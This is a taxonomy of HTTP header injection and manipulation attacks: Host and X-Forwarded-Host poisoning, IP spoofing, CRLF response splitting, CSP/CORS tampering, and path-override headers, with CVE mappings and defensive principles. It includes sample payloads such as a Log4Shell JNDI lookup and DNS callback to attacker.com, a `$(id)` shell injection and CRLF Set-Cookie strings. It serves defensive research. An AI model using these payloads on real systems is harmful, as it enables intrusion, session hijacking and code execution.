# HTTP Header Injection & Manipulation — Mutation/Variation Taxonomy

---

## Classification Structure

HTTP header-based vulnerabilities arise from a fundamental architectural property: **HTTP headers are plaintext key-value pairs whose semantics depend entirely on which component interprets them**. Because modern web architectures involve multiple processing layers — browsers, CDNs, reverse proxies, load balancers, application servers, logging systems, and downstream microservices — each header value may be parsed, trusted, transformed, or reflected by different components with different assumptions. This discrepancy space is the root of the entire attack surface.

This taxonomy organizes HTTP header mutations along three orthogonal axes:

- **Axis 1 — Mutation Target (WHAT header/mechanism is manipulated)**: The structural component of the HTTP message being attacked — the Host header, proxy-forwarding headers, correlation/tracing headers, CRLF injection points, security-policy headers, or content-semantic headers.

- **Axis 2 — Discrepancy Type (WHY the mutation works)**: The nature of the trust violation or parsing mismatch — implicit trust of client-supplied values, multi-layer interpretation disagreement, encoding normalization failure, or semantic override.

- **Axis 3 — Attack Scenario (WHERE it is weaponized)**: The downstream impact — cache poisoning, authentication bypass, access control bypass, XSS/code execution, log injection, session hijacking, SSRF, or CSRF bypass.

### Axis 2 Summary — Cross-Cutting Discrepancy Types

| Discrepancy Type | Mechanism | Applies to Sections |
|---|---|---|
| **Implicit Trust** | Application treats client-supplied header as authoritative without validation | §1, §2, §3, §5 |
| **Multi-Layer Disagreement** | Front-end and back-end interpret the same header differently | §1, §2, §4, §6 |
| **Injection/Delimiter Confusion** | CRLF or special characters create new headers or response boundaries | §4, §3, §7 |
| **Semantic Override** | Non-standard header overrides standard routing, path, or identity semantics | §6, §1, §2 |
| **Encoding Normalization Failure** | Unicode, double-encoding, or charset tricks bypass sanitization | §4, §7 |
| **Policy Injection** | Attacker injects or overrides security-policy directives via header values | §5, §7 |

---

## §1. Host Header Manipulation

The HTTP Host header identifies the target virtual host and is integral to URL generation, routing, access control, and caching. Because applications routinely use the Host value to construct URLs in responses — password reset links, redirects, canonical URLs, resource imports — any unvalidated trust in this header creates exploitable surface.

### §1-1. Direct Host Header Injection

The simplest form: supplying an arbitrary value in the Host header and observing whether the application reflects or acts upon it.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Password Reset Poisoning** | Application uses Host header value to construct password reset URLs in outbound emails. Attacker injects `Host: attacker.com`, victim receives reset link pointing to attacker domain. | App generates URLs from Host without validation; email delivery preserves the poisoned link |
| **URL Generation Poisoning** | Application uses Host value in `<base>`, `<link>`, `<script src>`, or redirect `Location` headers. Attacker injects domain to hijack resource loading. | Dynamic URL generation trusts Host; reflected in HTML or redirect responses |
| **Virtual Host Brute-Force** | Enumeration of internal virtual hosts by iterating Host values (e.g., `intranet.target.com`, `admin.target.com`) on a shared server | Multiple vhosts served from the same IP; no default vhost catch-all |
| **Open Redirect via Host** | Application constructs absolute redirect URLs from Host header, enabling redirection to attacker-controlled domain | Redirect logic concatenates scheme + Host + path without validation |

**Example payload:**
```
GET /reset-password HTTP/1.1
Host: attacker.com
```

### §1-2. Host Header Validation Bypass

When applications implement partial Host validation, multiple bypass techniques exploit parsing inconsistencies.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Port-Based Injection** | Inject arbitrary content via the port field: `Host: legitimate.com:"><script>alert(1)</script>` — many validators only check the hostname portion | App extracts and reflects port without sanitization |
| **Domain Suffix Matching** | Bypass allowlist by registering `Host: notvulnerable-site.com` or `Host: vulnerable-site.com.attacker.com` when validation only checks substring containment | Regex/substring matching instead of exact domain comparison |
| **Subdomain Injection** | Use a compromised or attacker-controlled subdomain: `Host: evil.vulnerable-site.com` to pass domain-scoped validation | Wildcard DNS or dangling subdomain exists |
| **Duplicate Host Headers** | Send two `Host:` headers — front-end validates the first, back-end processes the second (or vice versa) | Multi-layer architecture with inconsistent header priority |
| **Absolute URL + Host Disagreement** | Specify an absolute URL in the request line (`GET http://internal/ HTTP/1.1`) while the Host header contains a different value — some servers prioritize the request-line URL | RFC 7230 allows absolute-form; server implementations vary |
| **Line-Wrapped Host** | Indent a second Host-like line with space/tab to create ambiguity: front-end may ignore it, back-end may treat it as header continuation | HTTP/1.1 obs-fold parsing support varies by server |

### §1-3. Host Override via Alternative Headers

When the primary Host header is validated or locked by infrastructure, alternative headers can override the application's perception of the target host.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **X-Forwarded-Host** | Standard proxy header that many frameworks (Rails, Laravel, Django, Spring) read instead of Host when present | Framework auto-detects proxy headers; no infrastructure stripping |
| **X-Host** | Non-standard variant accepted by some application servers | Server configuration or framework middleware processes this header |
| **X-Forwarded-Server** | Apache-originated header indicating the original server name | Load balancer or app framework checks this header |
| **X-HTTP-Host-Override** | Override header supported by some middleware stacks | Middleware reads this header for routing decisions |
| **Forwarded (RFC 7239)** | Standardized replacement: `Forwarded: host=attacker.com` — may bypass filters only checking X-Forwarded-Host | App supports RFC 7239; filter doesn't inspect `Forwarded` header |

**Example payload:**
```
GET /reset-password HTTP/1.1
Host: legitimate.com
X-Forwarded-Host: attacker.com
```

---

## §2. Proxy/Forwarding Header Abuse

Reverse proxies, load balancers, and CDNs append or interpret forwarding headers to convey client identity, protocol, and routing information to backend servers. When backends trust these headers without verifying they originate from trusted infrastructure, the entire trust chain collapses.

### §2-1. Client IP Spoofing (X-Forwarded-For Family)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Direct XFF Injection** | Attacker adds `X-Forwarded-For: 127.0.0.1` to spoof client IP, bypassing IP-based ACLs, rate limiters, or geo-restrictions | Backend reads XFF without proxy trust chain validation |
| **XFF Append Confusion** | Proxy appends real IP to existing XFF value: `X-Forwarded-For: spoofed, real-ip`. Backend reads first value (leftmost) as client IP | Backend uses first IP in chain; no right-to-left trust parsing |
| **Multi-Header XFF** | Send multiple `X-Forwarded-For` headers — some backends concatenate them, others read only first or last | Header merging behavior varies by server/framework |
| **X-Real-IP Override** | Nginx-specific header: attacker supplies `X-Real-IP: 127.0.0.1` directly | Nginx config doesn't use `set_real_ip_from` with trusted proxy list |
| **X-Client-IP / X-Originating-IP** | Alternative IP identification headers accepted by some application stacks | App checks multiple IP headers in priority order; attacker supplies the one checked first |
| **X-Envoy-External-Address** | Envoy proxy-specific header for external client address | Envoy mesh trusts this header without verifying source |
| **Unparsable IP Bypass** | Supply malformed IP value (e.g., `X-Forwarded-For: not-an-ip`) that causes validation logic to fail open or throw exception handled incorrectly | Authentication/authorization code falls through to default-allow on parse error (CVE in Authentik) |

**Attack impact:** Rate limit bypass, admin panel access, WAF evasion, geo-restriction bypass, audit log manipulation.

### §2-2. Protocol & Routing Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **X-Forwarded-Proto Manipulation** | Set `X-Forwarded-Proto: http` on HTTPS requests to force redirect loops or downgrade security assumptions | App generates URLs based on this header; cached redirects poison all users |
| **X-Forwarded-Port Override** | Change perceived port to bypass port-based routing rules or trigger different application behavior | Backend uses this header for URL construction or routing |
| **Routing-Based SSRF** | Supply internal IP (`Host: 192.168.0.1`) to misconfigured load balancer, routing request to internal infrastructure | Load balancer routes based on Host header without restricting to known backends |
| **Connection State Attack** | Send benign first request over persistent connection, then follow with malicious Host — validation only checks first request | Keep-alive connection with per-request routing; validation at connection level, not request level |

### §2-3. Domain Fronting & Web Filter Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Classic Domain Fronting** | TLS SNI contains `allowed.com`, HTTP Host header contains `c2.attacker.com` — CDN routes to the Host value, bypassing network filters that inspect only SNI | CDN serves both domains; network filter checks TLS SNI only |
| **HTTP/2 Domain Fronting** | `:authority` pseudo-header vs Host header disagreement — proxy unaware of HTTP/2 semantics cannot compare against SNI | HTTP/2-capable CDN; legacy proxy inspection |
| **Host Header Web Filter Bypass** | Override Host to a value not on the organization's blocklist (e.g., the organization's own file-sharing domain) while communicating with C2 infrastructure | Network filter relies solely on Host header for domain categorization |

---

## §3. Correlation, Tracing & Custom Header Injection

Modern distributed architectures use correlation and tracing headers (`X-Request-ID`, `X-Correlation-ID`, `X-Trace-ID`, `X-Amzn-Trace-Id`) to propagate request context across microservices. These headers are **directly supplied by the client**, traverse multiple backend services, and are often written to logs, databases, CI pipelines, and error pages — creating a vast, underestimated attack surface.

### §3-1. Log Injection via Tracing Headers

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Log Forging** | Inject CRLF or log-format characters into `X-Request-ID` to create fake log entries, obscure attack trails, or inject misleading data | Logging system writes header value without sanitization; log viewer renders injected content |
| **Log4Shell via Correlation Header** | Inject JNDI lookup string: `X-Request-ID: ${jndi:ldap://attacker.com/a}` — triggers Log4j deserialization if the value reaches a vulnerable logging framework | Java backend using Log4j 2.x < 2.17.0; correlation header logged via string interpolation |
| **Log-Based XSS** | Inject HTML/JavaScript into tracing header that gets rendered in admin log viewer dashboards | Web-based log viewer renders header values without encoding; admin accesses poisoned logs |
| **SIEM/Analytics Injection** | Inject structured data (JSON, SQL fragments) into tracing headers to manipulate analytics pipelines or SIEM correlation rules | Header values flow into structured data stores or query engines |

### §3-2. Backend Context Injection via Tracing Headers

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **OS Command Injection** | `X-Request-ID: $(id)` or backtick variants — if header value reaches shell execution context (e.g., logging scripts, monitoring agents) | Backend passes header value to shell command without sanitization |
| **Path Traversal / File Write** | Correlation ID used as filename or directory component: `X-Correlation-ID: ../../../etc/cron.d/exploit` | Application uses header value to construct filesystem paths |
| **CI/CD Pipeline Injection** | Tracing header value flows into CI pipeline configuration, build scripts, or deployment manifests | Distributed tracing integrated with CI/CD systems; header value reaches template or script context |
| **JSON Injection** | `X-Request-ID: 1"},"payload":{"admin":"true","foo":"` — breaks out of JSON structure when header value is interpolated into JSON logs or API payloads | Backend constructs JSON by string concatenation rather than proper serialization |
| **SQL Injection** | `X-Forwarded-For: 1' OR 1=1 --` or similar injection via any header that reaches database queries (common in analytics/audit logging) | Application logs header values to database via unsanitized SQL string construction |

### §3-3. Header Reflection & Cross-Context Attacks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Response Header Reflection** | Correlation header value reflected in response headers (e.g., `X-Request-ID` echoed back), enabling header injection via CRLF in the reflected value | Server reflects request header values in response without sanitization |
| **Error Page Reflection** | Tracing header values displayed in error/debug pages, enabling XSS via injected HTML | Debug mode enabled; error handler renders header values in HTML context |
| **Cross-Service Propagation** | Header injected in Service A propagates to Services B, C, D via distributed tracing — exploiting the weakest service in the chain | Microservice architecture with tracing propagation; inconsistent sanitization across services |
| **Header-to-Header Injection** | `X-Request-ID: 1%0d%0aX-Admin: true` — inject new headers via CRLF within a reflected/forwarded correlation header | Backend or proxy does not strip CRLF from forwarded header values |

### §3-4. Discovery & Fuzzing Methodology for Custom Headers

| Technique | Method |
|---|---|
| **Access-Control-Expose-Headers** | Inspect CORS response headers for `*-id` or `*-trace` suffixes to identify custom headers |
| **Error-Based Discovery** | Send special characters (`' " % & > [ $`) in suspected header values and observe error responses for context clues |
| **Pattern Fuzzing** | Fuzz with patterns: `X-{COMPANY}-{FUZZ}`, `X-{FUZZ}-ID`, `X-Correlation-{FUZZ}` |
| **Blind/OOB Verification** | Use DNS/HTTP callbacks in header values to confirm backend processing: `X-Request-ID: ${jndi:dns://canary.attacker.com}` |

---

## §4. CRLF Injection & HTTP Response Splitting

CRLF injection is the foundational mechanism underlying many header-based attacks. By injecting Carriage Return (`\r`, `%0d`) and Line Feed (`\n`, `%0a`) characters into user input that reaches HTTP headers, an attacker can create new headers, terminate the header section, or inject an entirely new HTTP response body.

### §4-1. Basic CRLF Injection Vectors

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Header Injection (Single CRLF)** | Inject `%0d%0a` followed by a new header name-value pair: `%0d%0aSet-Cookie: session=attacker` | User input reflected in response header value without CRLF stripping |
| **Response Splitting (Double CRLF)** | Inject `%0d%0a%0d%0a` to terminate headers and inject arbitrary response body (HTML, JavaScript) | Input reaches response headers; server does not validate or strip CRLF sequences |
| **Session Fixation via Set-Cookie** | Inject `%0d%0aSet-Cookie: sessionid=ATTACKER_KNOWN_VALUE` to fix victim's session | CRLF in response header context + session management that accepts any session ID |
| **CORS Header Injection** | Inject `%0d%0aAccess-Control-Allow-Origin: *` to bypass same-origin restrictions | CRLF injection point in response header + victim browser respects injected CORS headers |
| **CSP Injection/Override** | Inject `%0d%0aContent-Security-Policy: default-src *` to weaken or override existing CSP | CRLF injection point; browser may process last-seen or most-permissive CSP |
| **Location Header Injection** | Inject `%0d%0aLocation: https://attacker.com` to redirect users | CRLF injection point + 3xx response code or browser follow behavior |

### §4-2. CRLF Encoding Bypass Techniques

When applications filter `%0d%0a`, multiple encoding and normalization tricks can bypass the filter.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Double URL Encoding** | `%250d%250a` — decoded once by proxy/WAF, second decode by application reveals CRLF | Multi-layer decoding: first layer strips one encoding level, second layer processes the actual CRLF |
| **Unicode CRLF (UTF-8 Multibyte)** | Characters `嘊` (contains `0a` in UTF-8 tail byte) and `嘍` (contains `0d`) — some parsers extract the trailing byte as LF/CR | Server normalizes UTF-8 to ASCII, extracting control characters from multibyte sequences |
| **Unicode Escape Sequences** | `\u000d\u000a` — Java/JavaScript Unicode escapes. U+010D (č) and U+010A (Ċ) are unrelated Latin characters and are not converted to CR/LF through standard Unicode normalization (NFC/NFD/NFKC/NFKD) | Occurs when the framework processes Unicode escape sequences |
| **Bare LF Injection** | Only `%0a` without `%0d` — many servers accept bare LF as line terminator | Server treats `\n` alone as valid header delimiter (common in Node.js, Python, Go) |
| **Null Byte + CRLF** | `%00%0d%0a` — null byte terminates filter's string processing, CRLF passes through | C-based string processing in filter; null byte acts as string terminator |
| **Tab/Space Confusion** | `%09` or `%20` before CRLF to trigger obs-fold interpretation or confuse parsers | Server supports HTTP header folding (obs-fold) |

### §4-3. CRLF Escalation to Request Smuggling

CRLF injection can be escalated from a reflected header issue to full request smuggling with cross-user impact.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Response Queue Poisoning** | Inject CRLF + `Connection: keep-alive` + complete second request — causes backend to send responses intended for other users to the attacker | Keep-alive connection between proxy and backend; injected request creates response desynchronization |
| **Request Smuggling via Header** | `GET /%20HTTP/1.1%0d%0aHost:%20attacker.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0a` — CRLF in URL/header creates a second complete request | Backend processes URL-decoded CRLF as real HTTP delimiters |
| **Cache Poisoning via Response Split** | Inject second response with malicious content; caching proxy stores the injected response for the target URL | Caching proxy between client and server; proxy treats injected response as legitimate |

---

## §5. Security Policy Header Manipulation

HTTP response headers that enforce security policies (CSP, CORS, HSTS, X-Frame-Options) can themselves be targets of injection or manipulation, weakening the security posture of the application.

### §5-1. Content-Security-Policy Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CSP Injection via Reflected Input** | Application reflects user input into CSP header (e.g., `report-uri` directive): inject `;script-src 'unsafe-inline'` to weaken the policy | Dynamic CSP construction incorporating user-controllable values |
| **CSP Header Duplication** | Inject a second `Content-Security-Policy` header with permissive policy — browser behavior on duplicate CSP varies (intersection vs. last-wins) | CRLF injection point in response headers; browser CSP merging behavior |
| **CSP Downgrade via Meta Tag** | If CRLF injection allows body injection, insert `<meta http-equiv="Content-Security-Policy" content="default-src *">` before the real CSP takes effect | Body injection possible; browser processes meta CSP before or instead of header CSP |
| **report-uri / report-to Hijack** | Override CSP reporting endpoint to attacker domain: captures violation reports containing page URLs, inline script content, and other sensitive context | CSP report directive controllable; violations leak sensitive application structure |

### §5-2. CORS Policy Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Origin Reflection Abuse** | Application reflects `Origin` header value directly into `Access-Control-Allow-Origin` without validation | Backend mirrors Origin; does not maintain an allowlist |
| **Null Origin Trust** | Application allows `Origin: null` (sent from sandboxed iframes, data: URIs, local files) | CORS policy permits `null` origin; attacker crafts request from sandbox context |
| **ACAO Injection via CRLF** | Inject `%0d%0aAccess-Control-Allow-Origin: attacker.com%0d%0aAccess-Control-Allow-Credentials: true` | CRLF injection point in response; victim browser honors injected CORS headers |
| **Subdomain Wildcard Abuse** | Application validates Origin against `*.target.com` — attacker uses XSS on any subdomain to issue cross-origin requests | Wildcard subdomain CORS + any XSS on any subdomain |

### §5-3. Other Security Header Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **X-Frame-Options Removal/Override** | Inject or override X-Frame-Options header to enable clickjacking on previously protected pages | CRLF injection or header override mechanism available |
| **HSTS Bypass via Header Injection** | Remove or modify `Strict-Transport-Security` header to enable SSL-stripping attacks | CRLF injection to inject conflicting HSTS directive with max-age=0 |
| **X-Content-Type-Options Removal** | Strip `X-Content-Type-Options: nosniff` to re-enable MIME sniffing attacks | Header injection or proxy misconfiguration allows header removal |
| **Cache-Control Manipulation** | Override `Cache-Control: no-store` with `Cache-Control: public, max-age=31536000` to force caching of sensitive responses | Header injection or proxy processes attacker-supplied cache directives |

---

## §6. Path & Routing Override Headers

Certain non-standard HTTP headers can override the request path or URL as processed by the backend, creating discrepancies between what the front-end access control validates and what the back-end actually serves.

### §6-1. URL/Path Override Headers

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **X-Original-URL Override** | `X-Original-URL: /admin` — backend processes this header's value as the actual request path, ignoring the URL validated by front-end ACLs | IIS/Symfony/some frameworks support this header; front-end validates request line, backend uses header |
| **X-Rewrite-URL Override** | Functionally identical to X-Original-URL; used by different server implementations | Server recognizes X-Rewrite-URL for URL rewriting |
| **X-Middleware-Subrequest Bypass** | `x-middleware-subrequest: src/middleware:src/middleware:...` — Next.js skips middleware (including auth) when this internal header is present with the correct path value (CVE-2025-29927, CVSS 9.1) | Next.js 11.1.4–15.2.2; header not stripped by upstream infrastructure |
| **Malformed Request-Line SSRF** | `GET @internal-server/path HTTP/1.1` — upstream proxy constructs URL as `http://backend@internal-server/path`, interpreting `backend` as username | Proxy concatenates backend host + request path; `@` triggers URL authority parsing |

### §6-2. Method Override Headers

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **X-HTTP-Method-Override** | Override HTTP method: `POST /resource` with `X-HTTP-Method-Override: DELETE` — bypasses method-based ACLs | Framework supports method override; ACL checks request-line method, app uses header method |
| **X-Method-Override / X-HTTP-Method** | Variant header names for the same mechanism | Different frameworks recognize different header names |
| **_method Parameter Equivalence** | Some frameworks accept `_method=PUT` in POST body as equivalent to the header-based override | Framework supports both header and parameter method override |

---

## §7. Content & MIME Type Header Manipulation

Headers governing content interpretation — `Content-Type`, `Content-Encoding`, `Accept`, `Content-Disposition` — can be manipulated to alter how servers parse request bodies or how browsers render response content.

### §7-1. Content-Type Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Content-Type Juggling** | Change `Content-Type: application/json` to `application/xml` to trigger XXE parsing on the same endpoint | Backend parses body according to Content-Type; XML parser enabled but not expected |
| **MIME Sniffing Exploitation** | Upload file with mismatched Content-Type and actual content (e.g., HTML disguised as image) — browser sniffs and executes as HTML | `X-Content-Type-Options: nosniff` not set; browser performs MIME sniffing |
| **Charset Encoding Tricks** | `Content-Type: text/html; charset=UTF-7` or `charset=ISO-2022-JP` — forces browser to use legacy charset that interprets ASCII-safe payloads as HTML | Browser supports legacy charsets; CSP/filter assumes UTF-8 encoding |
| **Multipart Boundary Confusion** | Manipulate multipart boundary string to confuse parser: `Content-Type: multipart/form-data; boundary=----exploit\r\nContent-Type: text/html` | Server processes first or second Content-Type differently; parser boundary injection |

### §7-2. Content-Encoding & Transfer Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Content-Encoding WAF Bypass** | Inject `Content-Encoding: gzip` header via CRLF to make WAF attempt (and fail) to decompress non-gzipped body, bypassing inspection | WAF inspects body based on Content-Encoding; injected header creates mismatch |
| **Transfer-Encoding Confusion** | Multiple or obfuscated `Transfer-Encoding` headers to create framing mismatches between proxy and backend | Classic request smuggling vector (§4-3 cross-reference); parsing disagreement on chunked vs. identity |
| **Accept-Encoding Manipulation** | Force specific encoding in responses to exploit decompression vulnerabilities or bypass content inspection | Backend serves differently based on Accept-Encoding |

### §7-3. Content-Disposition Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Filename Injection** | `Content-Disposition: attachment; filename="..\..\startup\malware.exe"` — path traversal in download filename | Browser or download manager processes filename without sanitization |
| **Inline vs. Attachment Confusion** | Change `attachment` to `inline` to force browser rendering of uploaded content (bypassing download-only protection) | Application relies on Content-Disposition to prevent browser execution |

---

## §8. Referer, Origin & Authentication-Context Headers

Headers that convey request origin, authentication state, or session context represent high-value manipulation targets for CSRF bypass, authentication bypass, and session attacks.

### §8-1. Referer Header Manipulation for CSRF Bypass

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Referer Omission** | Use `<meta name="referrer" content="no-referrer">` or `Referrer-Policy: no-referrer` to strip Referer — bypasses validation that only checks when header is present | CSRF defense skips validation when Referer is absent |
| **Referer Substring/Regex Bypass** | Include target domain in attacker URL query string: `https://attacker.com/?https://target.com` — passes substring match validation | Validation uses `contains()` or loose regex instead of strict origin comparison |
| **Referrer-Policy Override** | Inject `Referrer-Policy: unsafe-url` via header injection to force full URL disclosure in subsequent requests | CRLF injection or meta tag injection; forces browser to send full Referer to third parties |

### §8-2. Origin Header Manipulation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Null Origin Injection** | Force `Origin: null` via sandboxed iframe, data: URI, or cross-origin redirect — bypasses CORS/CSRF checks that allowlist null | Application trusts `Origin: null` |
| **Origin Spoofing in Non-Browser Contexts** | CLI tools, mobile apps, or custom HTTP clients set arbitrary Origin values — bypasses controls designed for browser enforcement | Server-side CORS/CSRF validation is the only defense; no CSRF token |

### §8-3. Authentication & Session Headers

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Authorization Header Leakage** | `Authorization` header sent to redirected domain — browser follows redirect and forwards Bearer token to attacker-controlled server | Open redirect + cross-origin redirect preserves Authorization header (browser-specific) |
| **Cookie Header Injection** | Inject `Cookie: admin=true` or session token via CRLF or proxy misconfiguration | Backend reads injected Cookie header as legitimate session data |
| **X-Api-Key / X-Auth-Token Spoofing** | Custom authentication headers accepted without mutual TLS or signature verification | Backend trusts custom auth headers from any source; no additional authentication factor |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Condition | Primary Mutation Categories |
|---|---|---|
| **Web Cache Poisoning** | CDN or caching proxy + unkeyed header reflected in response | §1 + §2-2 + §4-1 + §5 |
| **Password Reset Token Theft** | Email-based password reset flow using Host-derived URLs | §1-1 + §1-3 |
| **Authentication/Authorization Bypass** | Middleware-based auth + path/routing override headers | §6-1 + §2-1 + §8-3 |
| **Cross-Site Scripting (Stored/Reflected)** | Header values reflected in HTML/logs without encoding | §3-1 + §4-1 + §7-1 |
| **Remote Code Execution** | Log4j/shell execution context consuming header values | §3-2 + §3-1 |
| **Session Hijacking / Fixation** | CRLF injection into response headers + Set-Cookie | §4-1 + §8-3 |
| **SSRF / Internal Service Access** | Load balancer routing via Host + IP spoofing via XFF | §1-2 + §2-1 + §6-1 |
| **CSRF Bypass** | Referer/Origin validation weakness | §8-1 + §8-2 |
| **WAF/Filter Bypass** | Multi-layer architecture + encoding tricks + domain fronting | §4-2 + §2-3 + §7-2 |
| **Log Poisoning / Audit Trail Manipulation** | Logging systems consuming unsanitized headers | §3-1 + §2-1 |
| **Clickjacking** | Security header removal via injection | §5-3 |
| **Cache Poisoning Denial-of-Service (CPDoS)** | CDN + malformed header triggering error response cached for all users | §7-2 + §2-2 |

---

## CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §6-1 (X-Middleware-Subrequest) | CVE-2025-29927 (Next.js 11.1.4–15.2.2) | CVSS 9.1 — Complete authentication/authorization bypass via single header injection |
| §1-1 (Host Header Injection) | CVE-2024-40686 (IBM SmartCloud Analytics) | CVSS 5.4 — Cache poisoning, session hijacking, XSS |
| §1-1 (Host Header Injection) | CVE-2024-36419 (SuiteCRM < 8.6.1) | Cache poisoning, session hijacking, XSS |
| §1-1 (Host Header Injection) | CVE-2024-46452 (Online Shop Application) | Password reset token theft |
| §4-1 + §4-3 (CRLF → RCE) | CVE-2024-52875 (GFI KerioControl 9.2.5–9.4.5) | Critical — CRLF injection → XSS → malicious firmware upload → root RCE on firewall |
| §4-1 (CRLF Injection) | CVE-2024-20337 (Cisco Secure Client) | CRLF injection in SAML authentication flow |
| §2-1 (XFF Auth Bypass) | GHSA-77q8 (FastAPI-Guard) | Remote header injection via X-Forwarded-For manipulation |
| §2-1 (XFF Auth Bypass) | GHSA-7jxf (Authentik) | Password authentication bypass via unparsable X-Forwarded-For value |
| §4-1 (Stored XSS) | CVE-2020-2229 (Jenkins ≤ 2.235.3) | Stored XSS via improper sanitization of user display names in Jenkins UI (tooltip/help system) |
| §1-3 (X-Forwarded-Host XSS) | HackerOne #1392935 (Omise) | XSS via X-Forwarded-Host header |
| §1-1 (Host Header Injection) | HackerOne #698416 (New Relic) | Host header injection in authentication flow |
| §1-1 (Host Header Injection) | Bug Bounty Writeup (2025) | $1,000 — Password reset token theft via Host header |
| §1-1 (Host Header Injection) | Bug Bounty Writeup (Pethuraj) | $800 — Host header injection |
| §2-1 (XFF Rate Limit Bypass) | HackerOne #1011767 (Yelp) | X-Forwarded-For bypass of 403 restrictions |

---

## Detection Tools

### Offensive / Testing Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **Param Miner** (Burp Extension) | Unkeyed header/parameter discovery | Guesses header/cookie names and detects response differences to find cache poisoning vectors |
| **Burp Suite Pro — Scanner** | Header injection, CRLF, host header attacks | Active scanning with header manipulation and response analysis |
| **403Bypasser** (Burp Extension) | Path/routing override headers | Automated testing of X-Original-URL, X-Rewrite-URL, method override headers |
| **crlfuzz** | CRLF injection endpoints | Fast fuzzing of URL parameters with CRLF payloads and encoding variants |
| **Hackvertor** (Burp Extension) | Payload encoding/transformation | Live encode/decode for CRLF bypass payloads (double-encoding, Unicode, etc.) |
| **nuclei** (ProjectDiscovery) | Host header injection, CVE-specific | Template-based scanning including Host header injection and CVE-2025-29927 detection |
| **WhatWaf** | WAF detection and bypass | Identifies WAF type and suggests encoding-based bypass techniques |
| **waf-bypass** (nemesida) | WAF evasion validation | Comprehensive WAF bypass test suite including header-based vectors |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **ModSecurity + CRS** | CRLF injection, header injection | Rule-based detection of CRLF sequences and suspicious header patterns |
| **OWASP ZAP — Passive Scanner** | Header security audit | Identifies missing security headers and header injection opportunities |
| **Akamai / Cloudflare WAF** | CRLF, header injection, domain fronting | Cloud WAF rules blocking known CRLF encodings and suspicious header patterns |
| **securityheaders.com** | Security header audit | Evaluates presence and configuration of security response headers |
| **HCache** (Academic) | Cache poisoning detection | Systematic evaluation of web cache poisoning via unkeyed headers at scale |

---

## Summary: Core Principles

### The Root Cause

The entire HTTP header injection attack surface exists because of a single architectural property: **HTTP headers are client-controllable plaintext values that flow through multiple processing layers, each with independent trust assumptions and parsing behaviors.** The HTTP specification treats headers as extensible metadata, but modern web architectures have evolved to grant headers **semantic authority** — over routing (Host), identity (X-Forwarded-For), security policy (CSP, CORS), and operational context (X-Request-ID). The gap between "metadata that describes a request" and "directive that controls behavior" is the root of every vulnerability in this taxonomy.

### Why Incremental Fixes Fail

Each header-based vulnerability is typically patched at the point of exploitation: Host header validation in the password reset function, XFF sanitization in the rate limiter, CRLF stripping in the redirect handler. But these point fixes fail structurally because:

1. **New headers are constantly introduced** — every new proxy, framework, or middleware adds custom headers (`x-middleware-subrequest`, `X-Envoy-External-Address`), each creating fresh attack surface.
2. **Trust boundaries are implicit** — there is no standard mechanism to distinguish infrastructure-set headers from client-injected ones. The RFC 7239 `Forwarded` header attempted to standardize this but adoption remains partial.
3. **Multi-layer architectures multiply discrepancies** — adding a CDN, WAF, reverse proxy, or API gateway introduces another parsing layer with its own header priority rules, encoding normalization, and trust model.
4. **Correlation and tracing headers create lateral propagation** — a single injected value in `X-Request-ID` can reach logging infrastructure, CI/CD pipelines, SIEM systems, and error dashboards across the entire microservice topology.

### The Structural Solution

A robust defense requires treating HTTP headers with the same rigor as any other untrusted input — at every layer, not just at the application boundary:

- **Allowlist, don't blocklist**: Explicitly define which headers are accepted at each layer and strip all others. Infrastructure-set headers (XFF, X-Forwarded-Host) must be overwritten, not appended, by trusted proxies.
- **Normalize once, validate everywhere**: Encoding normalization (URL-decoding, Unicode NFC, charset conversion) should happen exactly once at the outermost trust boundary, and all downstream consumers should operate on the normalized form.
- **Break implicit trust chains**: Headers set by infrastructure should be cryptographically signed or conveyed through out-of-band channels (environment variables, mutual TLS metadata) rather than passed as plaintext headers that clients can forge.
- **Sanitize on write, encode on render**: Every header value written to logs, databases, HTML, JSON, or shell contexts must be sanitized for that specific output context — CRLF for HTTP, HTML-encoding for web rendering, parameterized queries for SQL.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

- PortSwigger Web Security Academy — [HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- PortSwigger Research — [Making HTTP Header Injection Critical via Response Queue Poisoning](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
- PortSwigger Research — [Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)
- ACM CCS 2024 — [Internet's Invisible Enemy: Detecting and Measuring Web Cache Poisoning in the Wild](https://dl.acm.org/doi/10.1145/3658644.3690361)
- ProjectDiscovery — [CVE-2025-29927: Next.js Middleware Authorization Bypass](https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass)
- OWASP — [Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)
